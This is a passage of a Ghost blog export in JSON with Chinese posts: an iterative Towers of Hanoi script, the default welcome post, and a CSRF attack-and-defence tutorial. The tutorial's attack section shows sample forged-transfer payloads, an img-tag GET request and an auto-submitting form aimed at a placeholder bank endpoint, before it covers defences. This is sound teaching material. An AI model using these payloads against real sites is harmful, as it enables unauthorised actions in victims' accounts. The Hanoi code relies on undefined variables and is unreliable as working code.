function(obj){\\n            var str, newobj = obj.constructor === Array ? [] : {};\\n            if(typeof obj !== 'object'){\\n                return;\\n            } else if(window.JSON){\\n                str = JSON.stringify(obj), //系列化对象\\n                        newobj = JSON.parse(str); //还原\\n            } else {\\n                for(var i in obj){\\n                    newobj[i] = typeof obj[i] === 'object' ?\\n                            cloneObj(obj[i]) : obj[i];\\n                }\\n            }\\n            return newobj;\\n        };\\n\\n        hanoi3(7)\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>递归和迭代都是循环的一种。网上很多都是用递归解决汉罗塔，。今天研究了下用迭代解决。 先贴出递归的javascript版。大家可以到chrome控制台直接调试。</p>\n<pre><code>var j=0;  \n        function Hanoi(n,a,b,c){\n            if(n&gt;=1){\n                Hanoi(n-1,a,c,b);\n                j++;\n                console.log('第'+j+'部从'+a+'移动到'+c);\n                Hanoi(n-1,b,a,c);\n            }\n        }\n        Hanoi(7,'A','B','C')\n</code></pre>\n<p>大多数的递归都可以改写成循环，递归从上而下。循环从下往上；递归由系统压栈，循环则要自己存储。就是，用简单的循环来代替递归的话，有时必须要手工维护一个数据结构。</p>\n<p>循环的解法</p>\n<pre><code>    Array.prototype.Run=function(to){\n            if(to=='left'){\n                for(var i=0;i&lt;this.length;i++){\n                    if(this[i].from=='B'){this[i].from='C';}else{\n                        if(this[i].from=='C'){this[i].from='B';}\n                    }\n                    if(this[i].to=='B'){this[i].to='C';}else{\n                        if(this[i].to=='C'){this[i].to='B';}\n                    }\n                }\n            }\n            if(to=='right'){\n                for(var i=0;i&lt;this.length;i++){\n                    if(this[i].from=='A'){this[i].from='B';}\n                    else{\n                        if(this[i].from=='B'){this[i].from='A';}\n                    }\n\n                    if(this[i].to=='A'){this[i].to='B';}else{\n                        if(this[i].to=='B'){this[i].to='A';}\n                    }\n\n                }\n            }\n            return this;\n        }\n        function hanoi3(n){\n            var a='A';\n            var b='B';\n            var c='C';\n            var temp=1;\n            for(var i=0;i&lt;n;i++){\n                temp = temp+temp+1;\n                if(i==0){ s.push(new to(a,c));continue;}\n                var temp =cloneObj(s);\n                var temp2=cloneObj(s);\n                s = temp.Run('left').concat([new to(a,c)],temp2.Run('right'));\n            }\n\n            for(var i=0;i&lt; s.length;i++){\n\n                console.log('第'+(i+1)+'从'+s[i].from+'移动到'+s[i].to);\n            }\n\n        }\n\n\n        var cloneObj = function(obj){\n            var str, newobj = obj.constructor === Array ? [] : {};\n            if(typeof obj !== 'object'){\n                return;\n            } else if(window.JSON){\n                str = JSON.stringify(obj), //系列化对象\n                        newobj = JSON.parse(str); //还原\n            } else {\n                for(var i in obj){\n                    newobj[i] = typeof obj[i] === 'object' ?\n                            cloneObj(obj[i]) : obj[i];\n                }\n            }\n            return newobj;\n        };\n\n        hanoi3(7)\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"82","plaintext":"递归和迭代都是循环的一种。网上很多都是用递归解决汉罗塔，。今天研究了下用迭代解决。 先贴出递归的javascript版。大家可以到chrome控制台直接调试。\n\nvar j=0;  \n        function Hanoi(n,a,b,c){\n            if(n>=1){\n                Hanoi(n-1,a,c,b);\n                j++;\n                console.log('第'+j+'部从'+a+'移动到'+c);\n                Hanoi(n-1,b,a,c);\n            }\n        }\n        Hanoi(7,'A','B','C')\n\n\n大多数的递归都可以改写成循环，递归从上而下。循环从下往上；递归由系统压栈，循环则要自己存储。就是，用简单的循环来代替递归的话，有时必须要手工维护一个数据结构。\n\n循环的解法\n\n    Array.prototype.Run=function(to){\n            if(to=='left'){\n                for(var i=0;i<this.length;i++){\n                    if(this[i].from=='B'){this[i].from='C';}else{\n                        if(this[i].from=='C'){this[i].from='B';}\n                    }\n                    if(this[i].to=='B'){this[i].to='C';}else{\n                        if(this[i].to=='C'){this[i].to='B';}\n                    }\n                }\n            }\n            if(to=='right'){\n                for(var i=0;i<this.length;i++){\n                    if(this[i].from=='A'){this[i].from='B';}\n                    else{\n                        if(this[i].from=='B'){this[i].from='A';}\n                    }\n\n                    if(this[i].to=='A'){this[i].to='B';}else{\n                        if(this[i].to=='B'){this[i].to='A';}\n                    }\n\n                }\n            }\n            return this;\n        }\n        function hanoi3(n){\n            var a='A';\n            var b='B';\n            var c='C';\n            var temp=1;\n            for(var i=0;i<n;i++){\n                temp = temp+temp+1;\n                if(i==0){ s.push(new to(a,c));continue;}\n                var temp =cloneObj(s);\n                var temp2=cloneObj(s);\n                s = temp.Run('left').concat([new to(a,c)],temp2.Run('right'));\n            }\n\n            for(var i=0;i< s.length;i++){\n\n                console.log('第'+(i+1)+'从'+s[i].from+'移动到'+s[i].to);\n            }\n\n        }\n\n\n        var cloneObj = function(obj){\n            var str, newobj = obj.constructor === Array ? [] : {};\n            if(typeof obj !== 'object'){\n                return;\n            } else if(window.JSON){\n                str = JSON.stringify(obj), //系列化对象\n                        newobj = JSON.parse(str); //还原\n            } else {\n                for(var i in obj){\n                    newobj[i] = typeof obj[i] === 'object' ?\n                            cloneObj(obj[i]) : obj[i];\n                }\n            }\n            return newobj;\n        };\n\n        hanoi3(7)","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-21T09:03:58.000Z","created_by":"1","updated_at":"2017-01-17T07:26:25.000Z","updated_by":"1","published_at":"2016-01-21T09:16:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d310","uuid":"815a3e21-e422-4575-92c2-8b18900106ae","title":"欢迎使用 Ghost 博客","slug":"welcome-to-ghost-2","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\" \\n\\nYeah，博客上线了！这篇文章的目的是向你介绍 Ghost 编辑器并帮你快速上手。通过 `&lt;your blog URL&gt;/ghost/` 链接就可以登录系统后台管理你的博客内容了。当你进入后台，你就能看到左侧文章列表处列出的这篇文章，右侧就是这篇文章的预览效果。点击预览栏右上角的铅笔图标就能进入内容编辑页面。 \\n\\n## 快速入门\\n\\nGhost 使用 Markdown 语法书写内容。简单来说，Markdown 就是一种简化的书写格式！\\n\\n用 Markdown 语法写作是很容易的。在编辑界面的左侧就是你写作的地方。在你认为需要的时候，可以使用以下这些语法来格式化你的内容。例如下面这个无序列表：\\n\\n*   Item number one\\n*   Item number two\\n\\n    *   A nested item\\n*   A final item\\n\\n还可以是有序列表：\\n\\n1.  Remember to buy some milk2.  Drink the milk3.  Tweet that I remembered to buy the milk, and drank it\\n\\n### 链接\\n\\n如果要链接其它页面，可以直接把页面的 URL 粘贴过来，例如 [http://www.ghostchina.com](http://www.ghostchina.com) - 会被自动识别为链接。但是，如果你想自定义链接文本，可以像这样： [Ghost 中文网](http://www.ghostchina.com)。很简单吧！\\n\\n### 图片\\n\\n插入图片也没问题！前提是你事先知道图片的 URL，然后像下面这样：\\n\\n[![The Ghost Logo](http://static.ghostchina.com/image/3/fe/34a9831916be9db1381ecb320491e.png)](http://static.ghostchina.com/image/3/fe/34a9831916be9db1381ecb320491e.png)\\n\\n如果图片在本地的硬盘里怎么办？也很简单！像下面这样书写就能为图片预留一个位置，然后你可以继续写作，回头再通过拖拽的方式把图片上传到服务器上。\\n\\n### 引用\\n\\n有些时候我们需要引用别人说的话，可以这样：\\n\\n> Wisdomous - it's definitely a word.\\n\\n### 代码\\n\\n或许你是个码农，需要贴一些代码到文章里，可以通过两个引号（Tab 键上面的那个键）加入行内代码 `&lt;code&gt;`。如果需要加入大段的代码，可以在代码前加 4 个空格缩进，这就是 Markdown 的语法。\\n\\n    <span class=\\\"hljs-class\\\">.awesome-thing</span> <span class=\\\"hljs-rules\\\">{\\n        <span class=\\\"hljs-rule\\\"><span class=\\\"hljs-attribute\\\">display</span>:<span class=\\\"hljs-value\\\"> block</span></span>;\\n        <span class=\\\"hljs-rule\\\"><span class=\\\"hljs-attribute\\\">width</span>:<span class=\\\"hljs-value\\\"> <span class=\\\"hljs-number\\\">100%</span></span></span>;\\n    }</span>\\n\\n### 分割线\\n\\n在任一新行输入 3 个或更多的短横线（减号）就是一条分隔线了。\\n\\n* * *\\n\\n### 高级用法\\n\\nMarkdown 还有一个特别用法，就是在你需要的时候可以直接书写 HTML 代码。\\n\\n<input type=\\\"text\\\" placeholder=\\\"这是个输入框！\\\">\\n\\n只要掌握了上面的这些介绍，你就已经入门了！继续写作吧！\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>Yeah，博客上线了！这篇文章的目的是向你介绍 Ghost 编辑器并帮你快速上手。通过 <code>&amp;lt;your blog URL&amp;gt;/ghost/</code> 链接就可以登录系统后台管理你的博客内容了。当你进入后台，你就能看到左侧文章列表处列出的这篇文章，右侧就是这篇文章的预览效果。点击预览栏右上角的铅笔图标就能进入内容编辑页面。</p>\n<h2 id=\"\">快速入门</h2>\n<p>Ghost 使用 Markdown 语法书写内容。简单来说，Markdown 就是一种简化的书写格式！</p>\n<p>用 Markdown 语法写作是很容易的。在编辑界面的左侧就是你写作的地方。在你认为需要的时候，可以使用以下这些语法来格式化你的内容。例如下面这个无序列表：</p>\n<ul>\n<li>\n<p>Item number one</p>\n</li>\n<li>\n<p>Item number two</p>\n<ul>\n<li>A nested item</li>\n</ul>\n</li>\n<li>\n<p>A final item</p>\n</li>\n</ul>\n<p>还可以是有序列表：</p>\n<ol>\n<li>Remember to buy some milk2.  Drink the milk3.  Tweet that I remembered to buy the milk, and drank it</li>\n</ol>\n<h3 id=\"\">链接</h3>\n<p>如果要链接其它页面，可以直接把页面的 URL 粘贴过来，例如 <a href=\"http://www.ghostchina.com\">http://www.ghostchina.com</a> - 会被自动识别为链接。但是，如果你想自定义链接文本，可以像这样： <a href=\"http://www.ghostchina.com\">Ghost 中文网</a>。很简单吧！</p>\n<h3 id=\"\">图片</h3>\n<p>插入图片也没问题！前提是你事先知道图片的 URL，然后像下面这样：</p>\n<p><a href=\"http://static.ghostchina.com/image/3/fe/34a9831916be9db1381ecb320491e.png\"><img src=\"http://static.ghostchina.com/image/3/fe/34a9831916be9db1381ecb320491e.png\" alt=\"The Ghost Logo\"></a></p>\n<p>如果图片在本地的硬盘里怎么办？也很简单！像下面这样书写就能为图片预留一个位置，然后你可以继续写作，回头再通过拖拽的方式把图片上传到服务器上。</p>\n<h3 id=\"\">引用</h3>\n<p>有些时候我们需要引用别人说的话，可以这样：</p>\n<blockquote>\n<p>Wisdomous - it's definitely a word.</p>\n</blockquote>\n<h3 id=\"\">代码</h3>\n<p>或许你是个码农，需要贴一些代码到文章里，可以通过两个引号（Tab 键上面的那个键）加入行内代码 <code>&amp;lt;code&amp;gt;</code>。如果需要加入大段的代码，可以在代码前加 4 个空格缩进，这就是 Markdown 的语法。</p>\n<pre><code>&lt;span class=&quot;hljs-class&quot;&gt;.awesome-thing&lt;/span&gt; &lt;span class=&quot;hljs-rules&quot;&gt;{\n    &lt;span class=&quot;hljs-rule&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;display&lt;/span&gt;:&lt;span class=&quot;hljs-value&quot;&gt; block&lt;/span&gt;&lt;/span&gt;;\n    &lt;span class=&quot;hljs-rule&quot;&gt;&lt;span class=&quot;hljs-attribute&quot;&gt;width&lt;/span&gt;:&lt;span class=&quot;hljs-value&quot;&gt; &lt;span class=&quot;hljs-number&quot;&gt;100%&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;;\n}&lt;/span&gt;\n</code></pre>\n<h3 id=\"\">分割线</h3>\n<p>在任一新行输入 3 个或更多的短横线（减号）就是一条分隔线了。</p>\n<hr>\n<h3 id=\"\">高级用法</h3>\n<p>Markdown 还有一个特别用法，就是在你需要的时候可以直接书写 HTML 代码。</p>\n<input type=\"text\" placeholder=\"这是个输入框！\">\n<p>只要掌握了上面的这些介绍，你就已经入门了！继续写作吧！</p>\n<!--kg-card-end: markdown-->","comment_id":"83","plaintext":"Yeah，博客上线了！这篇文章的目的是向你介绍 Ghost 编辑器并帮你快速上手。通过 &lt;your blog URL&gt;/ghost/ \n链接就可以登录系统后台管理你的博客内容了。当你进入后台，你就能看到左侧文章列表处列出的这篇文章，右侧就是这篇文章的预览效果。点击预览栏右上角的铅笔图标就能进入内容编辑页面。\n\n快速入门\nGhost 使用 Markdown 语法书写内容。简单来说，Markdown 就是一种简化的书写格式！\n\n用 Markdown 语法写作是很容易的。在编辑界面的左侧就是你写作的地方。在你认为需要的时候，可以使用以下这些语法来格式化你的内容。例如下面这个无序列表：\n\n * Item number one\n   \n   \n * Item number two\n   \n    * A nested item\n   \n   \n * A final item\n   \n   \n\n还可以是有序列表：\n\n 1. Remember to buy some milk2. Drink the milk3. Tweet that I remembered to buy\n    the milk, and drank it\n\n链接\n如果要链接其它页面，可以直接把页面的 URL 粘贴过来，例如 http://www.ghostchina.com -\n会被自动识别为链接。但是，如果你想自定义链接文本，可以像这样： Ghost 中文网 [http://www.ghostchina.com]。很简单吧！\n\n图片\n插入图片也没问题！前提是你事先知道图片的 URL，然后像下面这样：\n\n [http://static.ghostchina.com/image/3/fe/34a9831916be9db1381ecb320491e.png]\n\n如果图片在本地的硬盘里怎么办？也很简单！像下面这样书写就能为图片预留一个位置，然后你可以继续写作，回头再通过拖拽的方式把图片上传到服务器上。\n\n引用\n有些时候我们需要引用别人说的话，可以这样：\n\n> Wisdomous - it's definitely a word.\n\n\n代码\n或许你是个码农，需要贴一些代码到文章里，可以通过两个引号（Tab 键上面的那个键）加入行内代码 &lt;code&gt;。如果需要加入大段的代码，可以在代码前加\n4 个空格缩进，这就是 Markdown 的语法。\n\n<span class=\"hljs-class\">.awesome-thing</span> <span class=\"hljs-rules\">{\n    <span class=\"hljs-rule\"><span class=\"hljs-attribute\">display</span>:<span class=\"hljs-value\"> block</span></span>;\n    <span class=\"hljs-rule\"><span class=\"hljs-attribute\">width</span>:<span class=\"hljs-value\"> <span class=\"hljs-number\">100%</span></span></span>;\n}</span>\n\n\n分割线\n在任一新行输入 3 个或更多的短横线（减号）就是一条分隔线了。\n\n\n--------------------------------------------------------------------------------\n\n高级用法\nMarkdown 还有一个特别用法，就是在你需要的时候可以直接书写 HTML 代码。\n\n只要掌握了上面的这些介绍，你就已经入门了！继续写作吧！","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-01-20T07:05:41.000Z","created_by":"1","updated_at":"2016-08-12T19:29:43.000Z","updated_by":"1","published_at":"2015-12-07T07:05:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d311","uuid":"26ed4734-9ca7-45db-b456-296ac611c581","title":"CSRF攻击与防御","slug":"csrfgong-ji-yu-fang-yu","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 一.CSRF是什么\\n\\nCSRF（Cross-site request forgery），中文名称：跨站请求伪造，是一种广泛存在于网站中的安全漏洞，缩写为：CSRF/XSRF。\\n> 二.CSRF的原理\\n\\nCSRF攻击能劫持终端用户在已登录的Web站点上执行本意操作。简单的说，攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF的过程非常隐秘，受害人甚至无法察觉。\\n产生CSRF漏洞的原因主要有两点：一方面是开发者不够谨慎，编写的Web应用程序存在漏洞导致恶意利用：另一方面，是因为Web浏览器对于Cookie和HTTP身份验证的回话信息的处理存在一定的缺陷。\\n\\n![](/content/images/2017/02/-1.png)\\n\\n> 三.CSRF的恶意利用\\n\\n######3.1执行恶意操作\\n举个例子，假设某个站点具有转账功能，实现该功能的HTML表单如下：\\n```\\n<form action=\\\"transfer.php\\\" method=\\\"POST\\\">\\n账号：<input type=\\\"text\\\" name=\\\"toBankId\\\"/></br>\\n金额：<input type=\\\"text\\\" name=\\\"money\\\"/></br>\\n<input type=\\\"submit\\\" value=\\\"提交\\\"/>\\n</form>\\n```\\n这时候，只要输入对应的账号和金额提交，就能实现转账。假设，受害者点击含有恶意代码的链接，并浏览带有下面HTML代码的网页：\\n```\\n<img src=\\\"http://www.xxx.com.transfer.php?toBankId=99&money=1000\\\"\\n```\\n在这个CSRF的过程中，受害者是毫不知情的，莫名其妙发生了转账行为。CSRF的攻击最大的特点就是完全以用户的身份发起的，很难防御。\\n以上CSRF能成功地原因，还有一个是因为开发人员滥用$_REQUEST方法，导致本来的POST操作可以用GET方式实现。那么，开发人员改用$_POST()方法来获取数据，那么要想成功执行CSRF，需要加上Javascript代码。如下HTML：\\n```\\n<form id=\\\"test\\\" action=\\\"http://www.xxx.com.transfer.php\\\" method=\\\"POST\\\">\\n账号：<input type=\\\"text\\\" name=\\\"toBankId\\\"/></br>\\n金额：<input type=\\\"text\\\" name=\\\"money\\\"/></br>\\n<input type=\\\"submit\\\" value=\\\"提交\\\"/>\\n<script>document.getElementById(\\\"test\\\").submit()</script>**\\n```\\n######3.2获取信息\\n\\n同源策略，是浏览器安全的基石。但有，有时开发中要求B站中获取A站的数据，不得不使用JSONP的方式进行跨域请求，但是，攻击者可是可以直接获取信息的。JSONP如下：\\n```\\nfunction addScriptTag(src) {\\n  var script = document.createElement('script');\\n  script.setAttribute(\\\"type\\\",\\\"text/javascript\\\");\\n  script.src = src;\\n  document.body.appendChild(script);\\n}\\nwindow.onload = function () {\\n  addScriptTag('http://example.com/ip?callback=foo');\\n}\\nfunction foo(data) {\\n  console.log('Your public IP address is: ' + data.ip);\\n};\\n```\\nJSONP最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。但是，这种跨同源策略的的行为，也大大带来了风险，不可滥用。因为这些数据别人也是可以获取的。最后不要用JSONP传递敏感的用户信息。\\n\\n> 四.CSRF的防御\\n######4.1验证HTTP Referer\\n 根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问`http://bank.test/test?page=10&userID=101&money=10000`页面完成，用户必须先登录，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。\\n######4.2使用Token\\nCSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中。因此，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，对于token错误的请求，则认为是CSRF攻击，并拒绝该请求。\\n######4.3在HTTP头中自定义属性并验证\\n自定义HTTP头X-CSRF-Token。先把token放入meta：\\n<meta name=\\\"csrf-token\\\" content=\\\"{{ csrf_token() }}\\\">\\n然后在全局Ajax中使用这种方式设置X-CSRF-Token请求头并提交：\\n$.ajaxSetup({\\n    headers: {\\n        'X-CSRF-TOKEN': $('meta[name=\\\"csrf-token\\\"]').attr('content')\\n    }\\n});\\n每次Ajax请求则会自动加上自定义的HTTP头X-CSRF-Token。\\n######4.4 安全的跨域请求\\n使用新的W3C标准CORS，全称是\\\"跨域资源共享\\\"（Cross-origin resource sharing）。\\n下面是一个例子，浏览器发现这次跨源AJAX请求是一般请求，就自动在头信息之中，添加一个Origin字段。如下\\n\\nGET /cors HTTP/1.1\\nOrigin: http://api.bob.com\\nHost: api.alice.com\\nAccept-Language: en-US\\nConnection: keep-alive\\nUser-Agent: Mozilla/5.0\\n上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。如果在B站请求A站浏览器会不允许跨域获取数据。如果在A站返回的数据加上一个Access-Control-Allow-Origin:*的HTTP的头。这所有网站都能访问。但是，这并不是我们想要的，只需把Access-Control-Allow-Origin修改成需要给权限的网站即可。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>一.CSRF是什么</p>\n</blockquote>\n<p>CSRF（Cross-site request forgery），中文名称：跨站请求伪造，是一种广泛存在于网站中的安全漏洞，缩写为：CSRF/XSRF。</p>\n<blockquote>\n<p>二.CSRF的原理</p>\n</blockquote>\n<p>CSRF攻击能劫持终端用户在已登录的Web站点上执行本意操作。简单的说，攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF的过程非常隐秘，受害人甚至无法察觉。<br>\n产生CSRF漏洞的原因主要有两点：一方面是开发者不够谨慎，编写的Web应用程序存在漏洞导致恶意利用：另一方面，是因为Web浏览器对于Cookie和HTTP身份验证的回话信息的处理存在一定的缺陷。</p>\n<p><img src=\"/content/images/2017/02/-1.png\" alt=\"\"></p>\n<blockquote>\n<p>三.CSRF的恶意利用</p>\n</blockquote>\n<h6 id=\"31\">3.1执行恶意操作</h6>\n<p>举个例子，假设某个站点具有转账功能，实现该功能的HTML表单如下：</p>\n<pre><code>&lt;form action=&quot;transfer.php&quot; method=&quot;POST&quot;&gt;\n账号：&lt;input type=&quot;text&quot; name=&quot;toBankId&quot;/&gt;&lt;/br&gt;\n金额：&lt;input type=&quot;text&quot; name=&quot;money&quot;/&gt;&lt;/br&gt;\n&lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;\n&lt;/form&gt;\n</code></pre>\n<p>这时候，只要输入对应的账号和金额提交，就能实现转账。假设，受害者点击含有恶意代码的链接，并浏览带有下面HTML代码的网页：</p>\n<pre><code>&lt;img src=&quot;http://www.xxx.com.transfer.php?toBankId=99&amp;money=1000&quot;\n</code></pre>\n<p>在这个CSRF的过程中，受害者是毫不知情的，莫名其妙发生了转账行为。CSRF的攻击最大的特点就是完全以用户的身份发起的，很难防御。<br>\n以上CSRF能成功地原因，还有一个是因为开发人员滥用$_REQUEST方法，导致本来的POST操作可以用GET方式实现。那么，开发人员改用$_POST()方法来获取数据，那么要想成功执行CSRF，需要加上Javascript代码。如下HTML：</p>\n<pre><code>&lt;form id=&quot;test&quot; action=&quot;http://www.xxx.com.transfer.php&quot; method=&quot;POST&quot;&gt;\n账号：&lt;input type=&quot;text&quot; name=&quot;toBankId&quot;/&gt;&lt;/br&gt;\n金额：&lt;input type=&quot;text&quot; name=&quot;money&quot;/&gt;&lt;/br&gt;\n&lt;input type=&quot;submit&quot; value=&quot;提交&quot;/&gt;\n&lt;script&gt;document.getElementById(&quot;test&quot;).submit()&lt;/script&gt;**\n</code></pre>\n<h6 id=\"32\">3.2获取信息</h6>\n<p>同源策略，是浏览器安全的基石。但有，有时开发中要求B站中获取A站的数据，不得不使用JSONP的方式进行跨域请求，但是，攻击者可是可以直接获取信息的。JSONP如下：</p>\n<pre><code>function addScriptTag(src) {\n  var script = document.createElement('script');\n  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);\n  script.src = src;\n  document.body.appendChild(script);\n}\nwindow.onload = function () {\n  addScriptTag('http://example.com/ip?callback=foo');\n}\nfunction foo(data) {\n  console.log('Your public IP address is: ' + data.ip);\n};\n</code></pre>\n<p>JSONP最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。但是，这种跨同源策略的的行为，也大大带来了风险，不可滥用。因为这些数据别人也是可以获取的。最后不要用JSONP传递敏感的用户信息。</p>\n<blockquote>\n<p>四.CSRF的防御</p>\n</blockquote>\n<h6 id=\"41httpreferer\">4.1验证HTTP Referer</h6>\n<p>根据HTTP协议，在HTTP头中有一个字段叫Referer，它记录了该HTTP请求的来源地址。在通常情况下，访问一个安全受限页面的请求必须来自于同一个网站。比如某银行的转账是通过用户访问<code>http://bank.test/test?page=10&amp;userID=101&amp;money=10000</code>页面完成，用户必须先登录，然后通过点击页面上的按钮来触发转账事件。当用户提交请求时，该转账请求的Referer值就会是转账按钮所在页面的URL。而如果攻击者要对银行网站实施CSRF攻击，他只能在自己的网站构造请求，当用户通过攻击者的网站发送请求到银行时，该请求的Referer是指向攻击者的网站。因此，要防御CSRF攻击，银行网站只需要对于每一个转账请求验证其Referer值，如果是以bank. test开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。</p>\n<h6 id=\"42token\">4.2使用Token</h6>\n<p>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，该请求中所有的用户验证信息都存在于Cookie中。因此，抵御CSRF攻击的关键在于：在请求中放入攻击者所不能伪造的信息，并且该信息不存在于Cookie之中。开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，对于token错误的请求，则认为是CSRF攻击，并拒绝该请求。</p>\n<h6 id=\"43http\">4.3在HTTP头中自定义属性并验证</h6>\n<p>自定义HTTP头X-CSRF-Token。先把token放入meta：</p>\n<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">\n然后在全局Ajax中使用这种方式设置X-CSRF-Token请求头并提交：\n$.ajaxSetup({\n    headers: {\n        'X-CSRF-TOKEN': $('meta[name=\"csrf-token\"]').attr('content')\n    }\n});\n每次Ajax请求则会自动加上自定义的HTTP头X-CSRF-Token。\n######4.4 安全的跨域请求\n使用新的W3C标准CORS，全称是\"跨域资源共享\"（Cross-origin resource sharing）。\n下面是一个例子，浏览器发现这次跨源AJAX请求是一般请求，就自动在头信息之中，添加一个Origin字段。如下\n<p>GET /cors HTTP/1.1<br>\nOrigin: <a href=\"http://api.bob.com\">http://api.bob.com</a><br>\nHost: api.alice.com<br>\nAccept-Language: en-US<br>\nConnection: keep-alive<br>\nUser-Agent: Mozilla/5.0<br>\n上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。如果在B站请求A站浏览器会不允许跨域获取数据。如果在A站返回的数据加上一个Access-Control-Allow-Origin:*的HTTP的头。这所有网站都能访问。但是，这并不是我们想要的，只需把Access-Control-Allow-Origin修改成需要给权限的网站即可。</p>\n<!--kg-card-end: markdown-->","comment_id":"84","plaintext":"> 一.CSRF是什么\n\n\nCSRF（Cross-site request forgery），中文名称：跨站请求伪造，是一种广泛存在于网站中的安全漏洞，缩写为：CSRF/XSRF。\n\n> 二.CSRF的原理\n\n\nCSRF攻击能劫持终端用户在已登录的Web站点上执行本意操作。简单的说，攻击者透过盗用用户身份悄悄发送一个请求，或执行某些恶意操作，CSRF的过程非常隐秘，受害人甚至无法察觉。\n产生CSRF漏洞的原因主要有两点：一方面是开发者不够谨慎，编写的Web应用程序存在漏洞导致恶意利用：另一方面，是因为Web浏览器对于Cookie和HTTP身份验证的回话信息的处理存在一定的缺陷。\n\n\n\n> 三.CSRF的恶意利用\n\n\n3.1执行恶意操作\n举个例子，假设某个站点具有转账功能，实现该功能的HTML表单如下：\n\n<form action=\"transfer.php\" method=\"POST\">\n账号：<input type=\"text\" name=\"toBankId\"/></br>\n金额：<input type=\"text\" name=\"money\"/></br>\n<input type=\"submit\" value=\"提交\"/>\n</form>\n\n\n这时候，只要输入对应的账号和金额提交，就能实现转账。假设，受害者点击含有恶意代码的链接，并浏览带有下面HTML代码的网页：\n\n<img src=\"http://www.xxx.com.transfer.php?toBankId=99&money=1000\"\n\n\n在这个CSRF的过程中，受害者是毫不知情的，莫名其妙发生了转账行为。CSRF的攻击最大的特点就是完全以用户的身份发起的，很难防御。\n以上CSRF能成功地原因，还有一个是因为开发人员滥用$_REQUEST方法，导致本来的POST操作可以用GET方式实现。那么，开发人员改用$_POST()方法来获取数据，那么要想成功执行CSRF，需要加上Javascript代码。如下HTML：\n\n<form id=\"test\" action=\"http://www.xxx.com.transfer.php\" method=\"POST\">\n账号：<input type=\"text\" name=\"toBankId\"/></br>\n金额：<input type=\"text\" name=\"money\"/></br>\n<input type=\"submit\" value=\"提交\"/>\n<script>document.getElementById(\"test\").submit()</script>**\n\n\n3.2获取信息\n同源策略，是浏览器安全的基石。但有，有时开发中要求B站中获取A站的数据，不得不使用JSONP的方式进行跨域请求，但是，攻击者可是可以直接获取信息的。JSONP如下：\n\nfunction addScriptTag(src) {\n  var script = document.createElement('script');\n  script.setAttribute(\"type\",\"text/javascript\");\n  script.src = src;\n  document.body.appendChild(script);\n}\nwindow.onload = function () {\n  addScriptTag('http://example.com/ip?callback=foo');\n}\nfunction foo(data) {\n  console.log('Your public IP address is: ' + data.ip);\n};\n\n\nJSONP最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。但是，这种跨同源策略的的行为，也大大带来了风险，不可滥用。因为这些数据别人也是可以获取的。最后不要用JSONP传递敏感的用户信息。\n\n> 四.CSRF的防御\n\n\n4.1验证HTTP 